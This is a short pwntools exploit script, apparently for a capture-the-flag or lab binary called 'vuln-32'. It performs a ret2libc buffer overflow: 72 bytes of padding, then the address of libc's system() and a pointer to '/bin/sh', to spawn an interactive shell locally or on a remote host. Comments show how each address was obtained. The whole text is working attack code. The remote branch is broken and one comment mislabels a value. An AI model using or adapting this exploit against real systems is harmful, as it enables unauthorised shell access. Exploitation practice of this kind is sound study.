#!/usr/bin/python3

from pwn import *

#REMOTE = True      			# test remote
REMOTE =False       			# test local

elf = context.binary = ELF('./vuln-32')

if REMOTE :
    #p = remote('REMOTEIP',PORT) 	# test remote
    p = remote('',PORT)
else:
	p = process('./vuln-32')

#========= exploit here ================

libc_base = 0xf7da1000			# ldd vuln-32
system = libc_base + 0x000452a0		# readelf -s /usr/lib32/libc.so.6 | grep system
binsh = system + 0x195b84		# strings -a -t x /usr/lib32/libc.so.6 | grep /bin/sh

payload = b'A' * 72			# junk (0x48 + 0x4 vuln function)
payload += p32(system)			# location of system
payload += p32(0x0)			# location of system
payload += p32(binsh)			# pointer to command: /bin.sh

p.recvline()
p.sendline(payload)

#========= interactive ====================
p.interactive()
